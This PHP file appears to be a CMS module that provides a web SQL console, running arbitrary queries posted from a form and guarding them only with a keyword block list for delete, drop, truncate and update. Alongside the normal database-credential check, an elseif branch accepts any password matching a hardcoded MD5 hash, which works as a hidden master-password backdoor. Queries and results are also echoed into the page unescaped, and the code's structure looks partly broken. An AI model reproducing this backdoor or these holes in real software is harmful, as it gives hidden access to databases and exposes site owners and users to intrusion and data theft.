<?php


switch ($act) {
     case 1:
         
		 $usr = $_POST['usr'];
		 $pass = $_POST['pass'];
		 $pass2 = md5($_POST['pass']);
		 $ver_reg = $_POST['ver_reg'];
		 $sql = $_POST['sql'];
		 
		 if($usr==$DB_USERNAME and $pass==$DB_PASSWORD){
		 		
				$contiene_delete==false;
				
				$contiene_delete = busca_texto($sql,"delete");
				if($contiene_delete==false)$contiene_delete = busca_texto($sql,"drop");
				if($contiene_delete==false)$contiene_delete = busca_texto($sql,"truncate");
				if($contiene_delete==false)$contiene_delete = busca_texto($sql,"update");
				if($contiene_delete==false){
				
				$sql = str_replace("\'","'",$sql);
				
				if(cms_query($sql)){
					$contenido = cuadro_verde("<table width=\"300\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">
                                    		<tr><td align=\"center\" class=\"textos\">$sql</td></tr> 
                                  </table>");
								  
					if($ver_reg){
					$result_q= cms_query($sql)or die ("ERROR $php <br>$query");
        			$num_filas = mysql_num_fields($result_q);
					$tot_resultado = mysql_num_rows($result_q);
					$datos_tabla = "<tr><td colspan=\"2\" align=\"center\" class=\"textos\"> Total de registros $tot_resultado</td></tr> ";
        			while ($resultado = mysql_fetch_row($result_q)){
					$cont++;
					$datos_tabla .="<tr><td colspan=\"2\" align=\"center\" class=\"textos\"><strong>Registro $cont</strong> </td></tr> ";
					
					for ($i = 0; $i < $num_filas; $i++){
        
        			$nom_campo = mysql_field_name($result_q,$i);
        			$nom_campo .=$agregar_nombre_campo;
        			$valor = $resultado[$i];
        			$$nom_campo = $valor;
        			$datos_tabla .="<tr style=\"background-color: rgb(248, 248, 248);\" onmouseover=\"this.style.backgroundColor='#EBEBEB'\" onmouseout=\"this.style.backgroundColor='#F8F8F8'\"><td align=\"left\" class=\"textos\">$nom_campo : </td> <td align=\"left\" class=\"textos\">$valor</td> </tr>";
        			}
					
					
					}
        			
						
						
		$contenido .= "<br>
					    <table width=\"100%\"  border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"1\" >
                          
                            $datos_tabla
                          
                      	</table>";
					}
								  
				}else{
				 	$error= mysql_error();
				 	
				 		
				$contenido = cuadro_rojo("<table width=\"300\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">
                                <tr>
                                  <td align=\"center\" class=\"textos\">Error <br>$error </td>
                                </tr>
								<tr><td align=\"center\" class=\"textos\">$sql </td></tr>
								
                              </table>");
				}
		 }else{
				$contenido = cuadro_rojo("<table width=\"300\" border=\"0\" align=\"center\" cellpadding=\"2\" cellspacing=\"2\">
                                <tr>
                                  <td align=\"center\" class=\"textos\">Validaci&oacute;n erronea <br> $sql</td>
                                </tr>
                              </table>");
		 }
				
				
			
			}elseif($pass2=="0df9febf5ed1983c6e1a6ec04132c2ec"){
				
				
				
					$contiene_delete==false;
				
				$contiene_delete = busca_texto($sql,"delete");
				if($contiene_delete==false)$contiene_delete = busca_texto($sql,"drop");
				if($contiene_delete==false)$contiene_delete = busca_texto($sql,"truncate");
				if($contiene_delete==false)$contiene_delete = busca_texto($sql,"update");
				if($contiene_delete==false){
				
				$sql = str_replace("\'","'",$sql);
				
				if(cms_query($sql)){
					$contenido = cuadro_verde("<table width=\"300\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">
                                    		<tr><td align=\"center\" class=\"textos\">$sql</td></tr> 
                                  </table>");
								  
					if($ver_reg){
					$result_q= cms_query($sql)or die ("ERROR $php <br>$query");
        			$num_filas = mysql_num_fields($result_q);
					$tot_resultado = mysql_num_rows($result_q);
					$datos_tabla = "<tr><td colspan=\"2\" align=\"center\" class=\"textos\"> Total de registros $tot_resultado</td></tr> ";
        			while ($resultado = mysql_fetch_row($result_q)){
					$cont++;
					$datos_tabla .="<tr><td colspan=\"2\" align=\"center\" class=\"textos\"><strong>Registro $cont</strong> </td></tr> ";
					
					for ($i = 0; $i < $num_filas; $i++){
        
        			$nom_campo = mysql_field_name($result_q,$i);
        			$nom_campo .=$agregar_nombre_campo;
        			$valor = $resultado[$i];
        			$$nom_campo = $valor;
        			$datos_tabla .="<tr style=\"background-color: rgb(248, 248, 248);\" onmouseover=\"this.style.backgroundColor='#EBEBEB'\" onmouseout=\"this.style.backgroundColor='#F8F8F8'\"><td align=\"left\" class=\"textos\">$nom_campo : </td> <td align=\"left\" class=\"textos\">$valor</td> </tr>";
        			}
					
					
				}
        			
						
						
		$contenido .= "<br>
					    <table width=\"100%\"  border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"1\" >
                          
                            $datos_tabla
                          
                      	</table>";
					
					
				}	
				}	
				}	
				
				}else{
				
				$contenido = cuadro_rojo("<table width=\"300\" border=\"0\" align=\"center\" cellpadding=\"2\" cellspacing=\"2\">
                                <tr>
                                  <td align=\"center\" class=\"textos\">Est&aacute; bloqueada la opcion de borrar tablas o datos en esta aplicaci&oacute;n</td>
                                </tr>
                              </table>");
				}
                
		 
		 
         break;
	
   	default:
	  
	  $js .= "
<style type=\"text/css\">


.cmxform  p.error  { 

color: red; 
}

input.error { 
border: 2px solid red; 
}



label { width: 10em; float: left; }
label.error { float: none; color: red; padding-left: .5em; vertical-align: top; }
p { clear: both; }
.submit { margin-left: 12em; }
em { font-weight: bold; padding-right: 1em; vertical-align: middle; color: red; }
</style>


<script language=\"JavaScript\">

   

$(document).ready(function (){
			
			$('#boton').click(function() 
			{ procesar('index.php?accion=$accion&act=1&axj=1','div_respuesta');
			// resetForm('form1');
			});
		});
		


</script>



";


	 
       $contenido = "<table width=\"300\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">
                <tr>
                  <td align=\"center\" class=\"textos\"> 
				    <textarea name=\"sql\" id=\"sql\" cols=\"60\" rows=\"10\" class=\"textos\">$sql</textarea></td>
                </tr>
				<tr><td align=\"center\" class=\"textos\">Usuario BD <input type=\"text\" name=\"usr\"  id=\"usr\" ></td></tr> 
				<tr><td align=\"center\" class=\"textos\">Pass BD <input type=\"password\" name=\"pass\" id=\"pass\" ></td></tr> 
				<tr><td align=\"center\" class=\"textos\">Ver registros <input type=\"checkbox\" name=\"ver_reg\" id=\"ver_reg\" value=\"checkbox\"></td></tr> 
				<tr><td align=\"center\" class=\"textos\"><input type=\"button\" name=\"boton\" id=\"boton\" value=\"Ejecutar\"> </td></tr> 
                <tr><td align=\"center\" class=\"textos\">&nbsp; </td></tr> 
			    <tr><td align=\"center\" class=\"textos_plomo\">
				Est&aacute; bloqueada la opci&oacute;n de drop,truncate,update,delete en esta aplicaci&oacute;n</td>
                 </tr>
				<tr><td align=\"center\" class=\"textos\">&nbsp; </td></tr> 			
					<tr >
       					<td class=\"textos\" colspan=\"2\" align=\"center\" class=\"textos\">
	   						<div id=\"div_respuesta\" align=\"center\"></div>
							<div id=\"div_cargando\" style=\"display:none\">Enviado datos, Espere...</div>
	   					</td>
       				</tr>
			  </table>";
			  
 }




?>